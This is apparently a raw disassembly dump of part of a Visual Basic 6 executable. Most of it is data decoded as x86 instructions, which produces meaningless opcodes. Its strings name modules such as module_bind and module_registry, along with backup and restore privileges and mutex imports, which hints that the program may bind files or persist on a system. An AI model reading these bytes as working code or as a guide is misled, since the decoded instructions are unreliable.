  4079d0:	8c 71 40             	mov    %?,0x40(%ecx)
  4079d3:	00 ff                	add    %bh,%bh
  4079d5:	ff                   	(bad)
  4079d6:	ff                   	(bad)
  4079d7:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  4079db:	00 00                	add    %al,(%eax)
  4079dd:	00 00                	add    %al,(%eax)
  4079df:	00 70 c0             	add    %dh,-0x40(%eax)
  4079e2:	40                   	inc    %eax
  4079e3:	00 00                	add    %al,(%eax)
  4079e5:	00 00                	add    %al,(%eax)
  4079e7:	00 28                	add    %ch,(%eax)
  4079e9:	7b 40                	jnp    0x407a2b
  4079eb:	00 1b                	add    %bl,(%ebx)
  4079ed:	00 00                	add    %al,(%eax)
  4079ef:	00 00                	add    %al,(%eax)
  4079f1:	00 00                	add    %al,(%eax)
  4079f3:	00 ff                	add    %bh,%bh
  4079f5:	ff 00                	incl   (%eax)
  4079f7:	00 01                	add    %al,(%ecx)
  4079f9:	80 01 00             	addb   $0x0,(%ecx)
  4079fc:	00 00                	add    %al,(%eax)
  4079fe:	00 00                	add    %al,(%eax)
  407a00:	bc 6a 40 00 ff       	mov    $0xff00406a,%esp
  407a05:	ff                   	(bad)
  407a06:	ff                   	(bad)
  407a07:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  407a0b:	00 00                	add    %al,(%eax)
  407a0d:	00 00                	add    %al,(%eax)
  407a0f:	00 b0 c0 40 00 00    	add    %dh,0x40c0(%eax)
  407a15:	00 00                	add    %al,(%eax)
  407a17:	00 38                	add    %bh,(%eax)
  407a19:	7b 40                	jnp    0x407a5b
  407a1b:	00 01                	add    %al,(%ecx)
  407a1d:	00 00                	add    %al,(%eax)
  407a1f:	00 00                	add    %al,(%eax)
  407a21:	00 00                	add    %al,(%eax)
  407a23:	00 ff                	add    %bh,%bh
  407a25:	ff 00                	incl   (%eax)
  407a27:	00 01                	add    %al,(%ecx)
  407a29:	80 01 00             	addb   $0x0,(%ecx)
  407a2c:	00 00                	add    %al,(%eax)
  407a2e:	00 00                	add    %al,(%eax)
  407a30:	08 6d 40             	or     %ch,0x40(%ebp)
  407a33:	00 ff                	add    %bh,%bh
  407a35:	ff                   	(bad)
  407a36:	ff                   	(bad)
  407a37:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  407a3b:	00 00                	add    %al,(%eax)
  407a3d:	00 00                	add    %al,(%eax)
  407a3f:	00 3c c0             	add    %bh,(%eax,%eax,8)
  407a42:	40                   	inc    %eax
  407a43:	00 00                	add    %al,(%eax)
  407a45:	00 00                	add    %al,(%eax)
  407a47:	00 48 7b             	add    %cl,0x7b(%eax)
  407a4a:	40                   	inc    %eax
  407a4b:	00 02                	add    %al,(%edx)
  407a4d:	00 00                	add    %al,(%eax)
  407a4f:	00 00                	add    %al,(%eax)
  407a51:	00 00                	add    %al,(%eax)
  407a53:	00 ff                	add    %bh,%bh
  407a55:	ff 00                	incl   (%eax)
  407a57:	00 01                	add    %al,(%ecx)
  407a59:	80 01 00             	addb   $0x0,(%ecx)
  407a5c:	00 00                	add    %al,(%eax)
  407a5e:	00 00                	add    %al,(%eax)
  407a60:	cc                   	int3
  407a61:	6b 40 00 ff          	imul   $0xffffffff,0x0(%eax),%eax
  407a65:	ff                   	(bad)
  407a66:	ff                   	(bad)
  407a67:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  407a6b:	00 00                	add    %al,(%eax)
  407a6d:	00 00                	add    %al,(%eax)
  407a6f:	00 90 c0 40 00 00    	add    %dl,0x40c0(%eax)
  407a75:	00 00                	add    %al,(%eax)
  407a77:	00 54 7b 40          	add    %dl,0x40(%ebx,%edi,2)
  407a7b:	00 01                	add    %al,(%ecx)
  407a7d:	00 00                	add    %al,(%eax)
  407a7f:	00 00                	add    %al,(%eax)
  407a81:	00 00                	add    %al,(%eax)
  407a83:	00 ff                	add    %bh,%bh
  407a85:	ff 00                	incl   (%eax)
  407a87:	00 01                	add    %al,(%ecx)
  407a89:	80 01 00             	addb   $0x0,(%ecx)
  407a8c:	00 00                	add    %al,(%eax)
  407a8e:	00 00                	add    %al,(%eax)
  407a90:	6c                   	insb   (%dx),%es:(%edi)
  407a91:	6b 40 00 ff          	imul   $0xffffffff,0x0(%eax),%eax
  407a95:	ff                   	(bad)
  407a96:	ff                   	(bad)
  407a97:	ff 44 7e 40          	incl   0x40(%esi,%edi,2)
  407a9b:	00 00                	add    %al,(%eax)
  407a9d:	00 00                	add    %al,(%eax)
  407a9f:	00 2c c0             	add    %ch,(%eax,%eax,8)
  407aa2:	40                   	inc    %eax
  407aa3:	00 00                	add    %al,(%eax)
  407aa5:	00 00                	add    %al,(%eax)
  407aa7:	00 6c 7b 40          	add    %ch,0x40(%ebx,%edi,2)
  407aab:	00 01                	add    %al,(%ecx)
  407aad:	00 00                	add    %al,(%eax)
  407aaf:	00 00                	add    %al,(%eax)
  407ab1:	00 00                	add    %al,(%eax)
  407ab3:	00 ff                	add    %bh,%bh
  407ab5:	ff 00                	incl   (%eax)
  407ab7:	00 01                	add    %al,(%ecx)
  407ab9:	80 01 00             	addb   $0x0,(%ecx)
	...
  407ad8:	50                   	push   %eax
  407ad9:	72 6f                	jb     0x407b4a
  407adb:	6a 65                	push   $0x65
  407add:	63 74 31 00          	arpl   %esi,0x0(%ecx,%esi,1)
  407ae1:	00 00                	add    %al,(%eax)
  407ae3:	00 66 72             	add    %ah,0x72(%esi)
  407ae6:	6d                   	insl   (%dx),%es:(%edi)
  407ae7:	5f                   	pop    %edi
  407ae8:	6d                   	insl   (%dx),%es:(%edi)
  407ae9:	61                   	popa
  407aea:	69 6e 00 00 00 00 63 	imul   $0x63000000,0x0(%esi),%ebp
  407af1:	6c                   	insb   (%dx),%es:(%edi)
  407af2:	61                   	popa
  407af3:	73 73                	jae    0x407b68
  407af5:	5f                   	pop    %edi
  407af6:	6d                   	insl   (%dx),%es:(%edi)
  407af7:	61                   	popa
  407af8:	69 6e 00 00 6d 6f 64 	imul   $0x646f6d00,0x0(%esi),%ebp
  407aff:	75 6c                	jne    0x407b6d
  407b01:	65 5f                	gs pop %edi
  407b03:	6d                   	insl   (%dx),%es:(%edi)
  407b04:	61                   	popa
  407b05:	69 6e 00 7a 69 70 00 	imul   $0x70697a,0x0(%esi),%ebp
  407b0c:	6d                   	insl   (%dx),%es:(%edi)
  407b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b0e:	64 75 6c             	fs jne 0x407b7d
  407b11:	65 5f                	gs pop %edi
  407b13:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  407b16:	64 00 41 50          	add    %al,%fs:0x50(%ecx)
  407b1a:	49                   	dec    %ecx
  407b1b:	00 6d 6f             	add    %ch,0x6f(%ebp)
  407b1e:	64 75 6c             	fs jne 0x407b8d
  407b21:	65 5f                	gs pop %edi
  407b23:	72 6e                	jb     0x407b93
  407b25:	64 00 00             	add    %al,%fs:(%eax)
  407b28:	6d                   	insl   (%dx),%es:(%edi)
  407b29:	6f                   	outsl  %ds:(%esi),(%dx)
  407b2a:	64 75 6c             	fs jne 0x407b99
  407b2d:	65 5f                	gs pop %edi
  407b2f:	72 65                	jb     0x407b96
  407b31:	67 69 73 74 72 79 00 	imul   $0x6d007972,0x74(%bp,%di),%esi
  407b38:	6d 
  407b39:	6f                   	outsl  %ds:(%esi),(%dx)
  407b3a:	64 75 6c             	fs jne 0x407ba9
  407b3d:	65 5f                	gs pop %edi
  407b3f:	75 6e                	jne    0x407baf
  407b41:	74 69                	je     0x407bac
  407b43:	6c                   	insb   (%dx),%es:(%edi)
  407b44:	00 00                	add    %al,(%eax)
  407b46:	00 00                	add    %al,(%eax)
  407b48:	6d                   	insl   (%dx),%es:(%edi)
  407b49:	6f                   	outsl  %ds:(%esi),(%dx)
  407b4a:	64 75 6c             	fs jne 0x407bb9
  407b4d:	65 5f                	gs pop %edi
  407b4f:	70 61                	jo     0x407bb2
  407b51:	74 68                	je     0x407bbb
  407b53:	00 6d 6f             	add    %ch,0x6f(%ebp)
  407b56:	64 75 6c             	fs jne 0x407bc5
  407b59:	65 5f                	gs pop %edi
  407b5b:	63 68 65             	arpl   %ebp,0x65(%eax)
  407b5e:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  407b61:	00 00                	add    %al,(%eax)
  407b63:	00 4d 6f             	add    %cl,0x6f(%ebp)
  407b66:	64 75 6c             	fs jne 0x407bd5
  407b69:	65 31 00             	xor    %eax,%gs:(%eax)
  407b6c:	6d                   	insl   (%dx),%es:(%edi)
  407b6d:	6f                   	outsl  %ds:(%esi),(%dx)
  407b6e:	64 75 6c             	fs jne 0x407bdd
  407b71:	65 5f                	gs pop %edi
  407b73:	66 75 6e             	data16 jne 0x407be4
  407b76:	6e                   	outsb  %ds:(%esi),(%dx)
  407b77:	79 00                	jns    0x407b79
  407b79:	00 00                	add    %al,(%eax)
  407b7b:	00 24 00             	add    %ah,(%eax,%eax,1)
  407b7e:	00 00                	add    %al,(%eax)
  407b80:	53                   	push   %ebx
  407b81:	00 65 00             	add    %ah,0x0(%ebp)
  407b84:	52                   	push   %edx
  407b85:	00 65 00             	add    %ah,0x0(%ebp)
  407b88:	73 00                	jae    0x407b8a
  407b8a:	74 00                	je     0x407b8c
  407b8c:	6f                   	outsl  %ds:(%esi),(%dx)
  407b8d:	00 72 00             	add    %dh,0x0(%edx)
  407b90:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  407b94:	72 00                	jb     0x407b96
  407b96:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407b9c:	6c                   	insb   (%dx),%es:(%edi)
  407b9d:	00 65 00             	add    %ah,0x0(%ebp)
  407ba0:	67 00 65 00          	add    %ah,0x0(%di)
  407ba4:	00 00                	add    %al,(%eax)
  407ba6:	00 00                	add    %al,(%eax)
  407ba8:	22 00                	and    (%eax),%al
  407baa:	00 00                	add    %al,(%eax)
  407bac:	53                   	push   %ebx
  407bad:	00 65 00             	add    %ah,0x0(%ebp)
  407bb0:	42                   	inc    %edx
  407bb1:	00 61 00             	add    %ah,0x0(%ecx)
  407bb4:	63 00                	arpl   %eax,(%eax)
  407bb6:	6b 00 75             	imul   $0x75,(%eax),%eax
  407bb9:	00 70 00             	add    %dh,0x0(%eax)
  407bbc:	50                   	push   %eax
  407bbd:	00 72 00             	add    %dh,0x0(%edx)
  407bc0:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  407bc6:	6c                   	insb   (%dx),%es:(%edi)
  407bc7:	00 65 00             	add    %ah,0x0(%ebp)
  407bca:	67 00 65 00          	add    %ah,0x0(%di)
	...
  407bd6:	00 00                	add    %al,(%eax)
  407bd8:	7e 7c                	jle    0x407c56
  407bda:	1e                   	push   %ds
  407bdb:	e7 35                	out    %eax,$0x35
  407bdd:	11 a7 40 9e df 91    	adc    %esp,-0x6e2061c0(%edi)
  407be3:	11 86 f8 b3 4d 92    	adc    %eax,-0x6db24c08(%esi)
  407be9:	b5 46                	mov    $0x46,%ch
  407beb:	57                   	push   %edi
  407bec:	19 0a                	sbb    %ecx,(%edx)
  407bee:	f0 4b                	lock dec %ebx
  407bf0:	83 72 b6 a1          	xorl   $0xffffffa1,-0x4a(%edx)
  407bf4:	2f                   	das
  407bf5:	96                   	xchg   %eax,%esi
  407bf6:	ee                   	out    %al,(%dx)
  407bf7:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  407bf8:	c7                   	(bad)
  407bf9:	f4                   	hlt
  407bfa:	c7 86 c1 0b 4e 4b 81 	movl   $0x720b2081,0x4b4e0bc1(%esi)
  407c01:	20 0b 72 
  407c04:	96                   	xchg   %eax,%esi
  407c05:	e3 2b                	jecxz  0x407c32
  407c07:	80 7d f9 60          	cmpb   $0x60,-0x7(%ebp)
  407c0b:	55                   	push   %ebp
  407c0c:	dc 00                	faddl  (%eax)
  407c0e:	19 46 a1             	sbb    %eax,-0x5f(%esi)
  407c11:	3b 4d 22             	cmp    0x22(%ebp),%ecx
  407c14:	dc 2d 1f 4b 5a 4f    	fsubrl 0x4f5a4b1f
  407c1a:	ad                   	lods   %ds:(%esi),%eax
  407c1b:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  407c21:	0c 00                	or     $0x0,%al
  407c23:	aa                   	stos   %al,%es:(%edi)
  407c24:	00 60 d3             	add    %ah,-0x2d(%eax)
  407c27:	93                   	xchg   %eax,%ebx
  407c28:	44                   	inc    %esp
  407c29:	69 72 31 00 00 00 00 	imul   $0x0,0x31(%edx),%esi
  407c30:	2e 3d fb fc fa a0    	cs cmp $0xa0fafcfb,%eax
  407c36:	68 10 a7 38 08       	push   $0x838a710
  407c3b:	00 2b                	add    %ch,(%ebx)
  407c3d:	33 71 b5             	xor    -0x4b(%ecx),%esi
  407c40:	43                   	inc    %ebx
  407c41:	3a 5c 50 72          	cmp    0x72(%eax,%edx,2),%bl
  407c45:	6f                   	outsl  %ds:(%esi),(%dx)
  407c46:	67 72 61             	addr16 jb 0x407caa
  407c49:	6d                   	insl   (%dx),%es:(%edi)
  407c4a:	20 46 69             	and    %al,0x69(%esi)
  407c4d:	6c                   	insb   (%dx),%es:(%edi)
  407c4e:	65 73 5c             	gs jae 0x407cad
  407c51:	4d                   	dec    %ebp
  407c52:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  407c59:	74 20                	je     0x407c7b
  407c5b:	56                   	push   %esi
  407c5c:	69 73 75 61 6c 20 53 	imul   $0x53206c61,0x75(%ebx),%esi
  407c63:	74 75                	je     0x407cda
  407c65:	64 69 6f 5c 56 42 39 	imul   $0x38394256,%fs:0x5c(%edi),%ebp
  407c6c:	38 
  407c6d:	5c                   	pop    %esp
  407c6e:	56                   	push   %esi
  407c6f:	42                   	inc    %edx
  407c70:	36 2e 4f             	ss cs dec %edi
  407c73:	4c                   	dec    %esp
  407c74:	42                   	inc    %edx
  407c75:	00 00                	add    %al,(%eax)
  407c77:	00 56 42             	add    %dl,0x42(%esi)
  407c7a:	00 00                	add    %al,(%eax)
  407c7c:	30 7c 40 00          	xor    %bh,0x0(%eax,%eax,2)
  407c80:	00 00                	add    %al,(%eax)
  407c82:	00 00                	add    %al,(%eax)
  407c84:	06                   	push   %es
  407c85:	00 00                	add    %al,(%eax)
  407c87:	00 09                	add    %cl,(%ecx)
  407c89:	00 00                	add    %al,(%eax)
  407c8b:	00 40 7c             	add    %al,0x7c(%eax)
  407c8e:	40                   	inc    %eax
  407c8f:	00 78 7c             	add    %bh,0x7c(%eax)
  407c92:	40                   	inc    %eax
  407c93:	00 18                	add    %bl,(%eax)
  407c95:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  407c9c:	00 00                	add    %al,(%eax)
  407c9e:	00 00                	add    %al,(%eax)
  407ca0:	80 ba 19 00 2b 4f ad 	cmpb   $0xad,0x4f2b0019(%edx)
  407ca7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  407cad:	0c 00                	or     $0x0,%al
  407caf:	aa                   	stos   %al,%es:(%edi)
  407cb0:	00 60 d3             	add    %ah,-0x2d(%eax)
  407cb3:	93                   	xchg   %eax,%ebx
  407cb4:	54                   	push   %esp
  407cb5:	69 6d 65 72 31 00 00 	imul   $0x3172,0x65(%ebp),%ebp
  407cbc:	3a 4f ad             	cmp    -0x53(%edi),%cl
  407cbf:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  407cc5:	0c 00                	or     $0x0,%al
  407cc7:	aa                   	stos   %al,%es:(%edi)
  407cc8:	00 60 d3             	add    %ah,-0x2d(%eax)
  407ccb:	93                   	xchg   %eax,%ebx
  407ccc:	46                   	inc    %esi
  407ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  407cce:	72 6d                	jb     0x407d3d
  407cd0:	00 00                	add    %al,(%eax)
  407cd2:	00 00                	add    %al,(%eax)
  407cd4:	09 00                	or     %eax,(%eax)
  407cd6:	00 00                	add    %al,(%eax)
  407cd8:	6b 65 72 6e          	imul   $0x6e,0x72(%ebp),%esp
  407cdc:	65 6c                	gs insb (%dx),%es:(%edi)
  407cde:	33 32                	xor    (%edx),%esi
  407ce0:	00 00                	add    %al,(%eax)
  407ce2:	00 00                	add    %al,(%eax)
  407ce4:	0d 00 00 00 43       	or     $0x43000000,%eax
  407ce9:	72 65                	jb     0x407d50
  407ceb:	61                   	popa
  407cec:	74 65                	je     0x407d53
  407cee:	4d                   	dec    %ebp
  407cef:	75 74                	jne    0x407d65
  407cf1:	65 78 41             	gs js  0x407d35
  407cf4:	00 00                	add    %al,(%eax)
  407cf6:	00 00                	add    %al,(%eax)
  407cf8:	d8 7c 40 00          	fdivrs 0x0(%eax,%eax,2)
  407cfc:	e8 7c 40 00 00       	call   0x40bd7d
  407d01:	00 04 00             	add    %al,(%eax,%eax,1)
  407d04:	1c c7                	sbb    $0xc7,%al
  407d06:	40                   	inc    %eax
	...
  407d0f:	00 a1 24 c7 40 00    	add    %ah,0x40c724(%ecx)
  407d15:	0b c0                	or     %eax,%eax
  407d17:	74 02                	je     0x407d1b
  407d19:	ff e0                	jmp    *%eax
  407d1b:	68 f8 7c 40 00       	push   $0x407cf8
  407d20:	b8 90 10 40 00       	mov    $0x401090,%eax
  407d25:	ff d0                	call   *%eax
  407d27:	ff e0                	jmp    *%eax
  407d29:	00 00                	add    %al,(%eax)
  407d2b:	00 0d 00 00 00 52    	add    %cl,0x52000000
  407d31:	65 6c                	gs insb (%dx),%es:(%edi)
  407d33:	65 61                	gs popa
  407d35:	73 65                	jae    0x407d9c
  407d37:	4d                   	dec    %ebp
  407d38:	75 74                	jne    0x407dae
  407d3a:	65 78 00             	gs js  0x407d3d
  407d3d:	00 00                	add    %al,(%eax)
  407d3f:	00 d8                	add    %bl,%al
  407d41:	7c 40                	jl     0x407d83
  407d43:	00 30                	add    %dh,(%eax)
  407d45:	7d 40                	jge    0x407d87
  407d47:	00 00                	add    %al,(%eax)
  407d49:	00 04 00             	add    %al,(%eax,%eax,1)
  407d4c:	28 c7                	sub    %al,%bh
  407d4e:	40                   	inc    %eax
	...
  407d57:	00 a1 30 c7 40 00    	add    %ah,0x40c730(%ecx)
  407d5d:	0b c0                	or     %eax,%eax
  407d5f:	74 02                	je     0x407d63
  407d61:	ff e0                	jmp    *%eax
  407d63:	68 40 7d 40 00       	push   $0x407d40
  407d68:	b8 90 10 40 00       	mov    $0x401090,%eax
  407d6d:	ff d0                	call   *%eax
  407d6f:	ff e0                	jmp    *%eax
  407d71:	00 00                	add    %al,(%eax)
  407d73:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407d76:	00 00                	add    %al,(%eax)
  407d78:	43                   	inc    %ebx
  407d79:	6c                   	insb   (%dx),%es:(%edi)
  407d7a:	6f                   	outsl  %ds:(%esi),(%dx)
  407d7b:	73 65                	jae    0x407de2
  407d7d:	48                   	dec    %eax
  407d7e:	61                   	popa
  407d7f:	6e                   	outsb  %ds:(%esi),(%dx)
  407d80:	64 6c                	fs insb (%dx),%es:(%edi)
  407d82:	65 00 d8             	gs add %bl,%al
  407d85:	7c 40                	jl     0x407dc7
  407d87:	00 78 7d             	add    %bh,0x7d(%eax)
  407d8a:	40                   	inc    %eax
  407d8b:	00 00                	add    %al,(%eax)
  407d8d:	00 04 00             	add    %al,(%eax,%eax,1)
  407d90:	34 c7                	xor    $0xc7,%al
  407d92:	40                   	inc    %eax
	...
  407d9b:	00 a1 3c c7 40 00    	add    %ah,0x40c73c(%ecx)
  407da1:	0b c0                	or     %eax,%eax
  407da3:	74 02                	je     0x407da7
  407da5:	ff e0                	jmp    *%eax
  407da7:	68 84 7d 40 00       	push   $0x407d84
  407dac:	b8 90 10 40 00       	mov    $0x401090,%eax
  407db1:	ff d0                	call   *%eax
  407db3:	ff e0                	jmp    *%eax
  407db5:	00 00                	add    %al,(%eax)
  407db7:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407dba:	48                   	dec    %eax
	...
  407dc3:	00 23                	add    %ah,(%ebx)
  407dc5:	3d fb fc fa a0       	cmp    $0xa0fafcfb,%eax
  407dca:	68 10 a7 38 08       	push   $0x838a710
  407dcf:	00 2b                	add    %ch,(%ebx)
  407dd1:	33 71 b5             	xor    -0x4b(%ecx),%esi
  407dd4:	22 3d fb fc fa a0    	and    0xa0fafcfb,%bh
  407dda:	68 10 a7 38 08       	push   $0x838a710
  407ddf:	00 2b                	add    %ch,(%ebx)
  407de1:	33 71 b5             	xor    -0x4b(%ecx),%esi
  407de4:	02 00                	add    (%eax),%al
  407de6:	00 00                	add    %al,(%eax)
  407de8:	c4 7d 40             	les    0x40(%ebp),%edi
  407deb:	00 d4                	add    %dl,%ah
  407ded:	7d 40                	jge    0x407e2f
  407def:	00 00                	add    %al,(%eax)
  407df1:	00 00                	add    %al,(%eax)
  407df3:	00 79 4f             	add    %bh,0x4f(%ecx)
  407df6:	ad                   	lods   %ds:(%esi),%eax
  407df7:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  407dfd:	0c 00                	or     $0x0,%al
  407dff:	aa                   	stos   %al,%es:(%edi)
  407e00:	00 60 d3             	add    %ah,-0x2d(%eax)
  407e03:	93                   	xchg   %eax,%ebx
  407e04:	06                   	push   %es
  407e05:	00 00                	add    %al,(%eax)
  407e07:	00 53 6c             	add    %dl,0x6c(%ebx)
  407e0a:	65 65 70 00          	gs gs jo 0x407e0e
  407e0e:	00 00                	add    %al,(%eax)
  407e10:	d8 7c 40 00          	fdivrs 0x0(%eax,%eax,2)
  407e14:	08 7e 40             	or     %bh,0x40(%esi)
  407e17:	00 00                	add    %al,(%eax)
  407e19:	00 04 00             	add    %al,(%eax,%eax,1)
  407e1c:	40                   	inc    %eax
  407e1d:	c7 40 00 00 00 00 00 	movl   $0x0,0x0(%eax)
  407e24:	00 00                	add    %al,(%eax)
  407e26:	00 00                	add    %al,(%eax)
  407e28:	a1 48 c7 40 00       	mov    0x40c748,%eax
  407e2d:	0b c0                	or     %eax,%eax
  407e2f:	74 02                	je     0x407e33
  407e31:	ff e0                	jmp    *%eax
  407e33:	68 10 7e 40 00       	push   $0x407e10
  407e38:	b8 90 10 40 00       	mov    $0x401090,%eax
  407e3d:	ff d0                	call   *%eax
  407e3f:	ff e0                	jmp    *%eax
  407e41:	00 00                	add    %al,(%eax)
  407e43:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407e46:	08 00                	or     %al,(%eax)
	...
  407e50:	08 00                	or     %al,(%eax)
  407e52:	00 00                	add    %al,(%eax)
  407e54:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  407e58:	78 00                	js     0x407e5a
  407e5a:	65 00 00             	add    %al,%gs:(%eax)
  407e5d:	00 00                	add    %al,(%eax)
  407e5f:	00 59 4f             	add    %bl,0x4f(%ecx)
  407e62:	ad                   	lods   %ds:(%esi),%eax
  407e63:	33 99 66 cf 11 b7    	xor    -0x48ee309a(%ecx),%ebx
  407e69:	0c 00                	or     $0x0,%al
  407e6b:	aa                   	stos   %al,%es:(%edi)
  407e6c:	00 60 d3             	add    %ah,-0x2d(%eax)
  407e6f:	93                   	xchg   %eax,%ebx
  407e70:	02 00                	add    (%eax),%al
  407e72:	00 00                	add    %al,(%eax)
  407e74:	5c                   	pop    %esp
  407e75:	00 00                	add    %al,(%eax)
  407e77:	00 20                	add    %ah,(%eax)
  407e79:	00 00                	add    %al,(%eax)
  407e7b:	00 41 00             	add    %al,0x0(%ecx)
  407e7e:	63 00                	arpl   %eax,(%eax)
  407e80:	63 00                	arpl   %eax,(%eax)
  407e82:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  407e86:	73 00                	jae    0x407e88
  407e88:	20 00                	and    %al,(%eax)
  407e8a:	69 00 73 00 20 00    	imul   $0x200073,(%eax),%eax
  407e90:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  407e94:	6e                   	outsb  %ds:(%esi),(%dx)
  407e95:	00 69 00             	add    %ch,0x0(%ecx)
  407e98:	65 00 64 00 00       	add    %ah,%gs:0x0(%eax,%eax,1)
  407e9d:	00 00                	add    %al,(%eax)
  407e9f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  407ea2:	00 00                	add    %al,(%eax)
  407ea4:	53                   	push   %ebx
  407ea5:	00 79 00             	add    %bh,0x0(%ecx)
  407ea8:	73 00                	jae    0x407eaa
  407eaa:	74 00                	je     0x407eac
  407eac:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  407eb0:	00 00                	add    %al,(%eax)
  407eb2:	00 00                	add    %al,(%eax)
  407eb4:	08 00                	or     %al,(%eax)
  407eb6:	00 00                	add    %al,(%eax)
  407eb8:	50                   	push   %eax
  407eb9:	00 72 00             	add    %dh,0x0(%edx)
  407ebc:	6f                   	outsl  %ds:(%esi),(%dx)
  407ebd:	00 33                	add    %dh,(%ebx)
  407ebf:	00 00                	add    %al,(%eax)
  407ec1:	00 00                	add    %al,(%eax)
  407ec3:	00 b8 66 c4 a4 9f    	add    %bh,-0x605b3b9a(%eax)
  407ec9:	49                   	dec    %ecx
  407eca:	1b 10                	sbb    (%eax),%edx
  407ecc:	bb 78 00 aa 00       	mov    $0xaa0078,%ebx
  407ed1:	38 3c bb             	cmp    %bh,(%ebx,%edi,4)
  407ed4:	c4 7d 40             	les    0x40(%ebp),%edi
  407ed7:	00 4c c7 40          	add    %cl,0x40(%edi,%eax,8)
  407edb:	00 56 42             	add    %dl,0x42(%esi)
  407ede:	41                   	inc    %ecx
  407edf:	36 2e 44             	ss cs inc %esp
  407ee2:	4c                   	dec    %esp
  407ee3:	4c                   	dec    %esp
  407ee4:	00 00                	add    %al,(%eax)
  407ee6:	00 00                	add    %al,(%eax)
  407ee8:	2b 3d fb fc fa a0    	sub    0xa0fafcfb,%edi
  407eee:	68 10 a7 38 08       	push   $0x838a710
  407ef3:	00 2b                	add    %ch,(%ebx)
  407ef5:	33 71 b5             	xor    -0x4b(%ecx),%esi
  407ef8:	cf                   	iret
  407ef9:	ae                   	scas   %es:(%edi),%al
  407efa:	57                   	push   %edi
  407efb:	06                   	push   %es
  407efc:	61                   	popa
  407efd:	05 be 49 83 1a       	add    $0x1a8349be,%eax
  407f02:	6f                   	outsl  %ds:(%esi),(%dx)
  407f03:	6a e1                	push   $0xffffffe1
  407f05:	80 85 8e 2a 3d fb fc 	addb   $0xfc,-0x4c2d572(%ebp)
  407f0c:	fa                   	cli
  407f0d:	a0 68 10 a7 38       	mov    0x38a71068,%al
  407f12:	08 00                	or     %al,(%eax)
  407f14:	2b 33                	sub    (%ebx),%esi
  407f16:	71 b5                	jno    0x407ecd
  407f18:	b7 5a                	mov    $0x5a,%bh
  407f1a:	7c 34                	jl     0x407f50
  407f1c:	81 8a 25 48 b6 5b a5 	orl    $0x78ab96a5,0x5bb64825(%edx)
  407f23:	96 ab 78 
  407f26:	87 38                	xchg   %edi,(%eax)
  407f28:	21 3d fb fc fa a0    	and    %edi,0xa0fafcfb
  407f2e:	68 10 a7 38 08       	push   $0x838a710
  407f33:	00 2b                	add    %ch,(%ebx)
  407f35:	33 71 b5             	xor    -0x4b(%ecx),%esi
  407f38:	43                   	inc    %ebx
  407f39:	6c                   	insb   (%dx),%es:(%edi)
  407f3a:	61                   	popa
  407f3b:	73 73                	jae    0x407fb0
  407f3d:	00 00                	add    %al,(%eax)
  407f3f:	00 21                	add    %ah,(%ecx)
  407f41:	4a                   	dec    %edx
  407f42:	54                   	push   %esp
  407f43:	ea 2d c8 d1 11 a3 e4 	ljmp   $0xe4a3,$0x11d1c82d
  407f4a:	00 a0 c9 0a ea 82    	add    %ah,-0x7d15f537(%eax)
  407f50:	43                   	inc    %ebx
  407f51:	3a 5c 57 49          	cmp    0x49(%edi,%edx,2),%bl
  407f55:	4e                   	dec    %esi
  407f56:	44                   	inc    %esp
  407f57:	4f                   	dec    %edi
  407f58:	57                   	push   %edi
  407f59:	53                   	push   %ebx
  407f5a:	5c                   	pop    %esp
  407f5b:	73 79                	jae    0x407fd6
  407f5d:	73 74                	jae    0x407fd3
  407f5f:	65 6d                	gs insl (%dx),%es:(%edi)
  407f61:	33 32                	xor    (%edx),%esi
  407f63:	5c                   	pop    %esp
  407f64:	6d                   	insl   (%dx),%es:(%edi)
  407f65:	73 76                	jae    0x407fdd
  407f67:	62 76 6d             	bound  %esi,0x6d(%esi)
  407f6a:	36 30 2e             	xor    %ch,%ss:(%esi)
  407f6d:	64 6c                	fs insb (%dx),%es:(%edi)
  407f6f:	6c                   	insb   (%dx),%es:(%edi)
  407f70:	5c                   	pop    %esp
  407f71:	33 00                	xor    (%eax),%eax
  407f73:	00 56 42             	add    %dl,0x42(%esi)
  407f76:	52                   	push   %edx
  407f77:	55                   	push   %ebp
  407f78:	4e                   	dec    %esi
  407f79:	00 00                	add    %al,(%eax)
  407f7b:	00 40 7f             	add    %al,0x7f(%eax)
  407f7e:	40                   	inc    %eax
  407f7f:	00 00                	add    %al,(%eax)
  407f81:	00 00                	add    %al,(%eax)
  407f83:	00 06                	add    %al,(%esi)
  407f85:	00 00                	add    %al,(%eax)
  407f87:	00 09                	add    %cl,(%ecx)
  407f89:	00 00                	add    %al,(%eax)
  407f8b:	00 50 7f             	add    %dl,0x7f(%eax)
  407f8e:	40                   	inc    %eax
  407f8f:	00 74 7f 40          	add    %dh,0x40(%edi,%edi,2)
  407f93:	00 50 c7             	add    %dl,-0x39(%eax)
  407f96:	40                   	inc    %eax
	...
  407f9f:	00 80 ba 19 00 0c    	add    %al,0xc0019ba(%eax)
  407fa5:	00 40 00             	add    %al,0x0(%eax)
	...
  407fb0:	08 00                	or     %al,(%eax)
  407fb2:	00 00                	add    %al,(%eax)
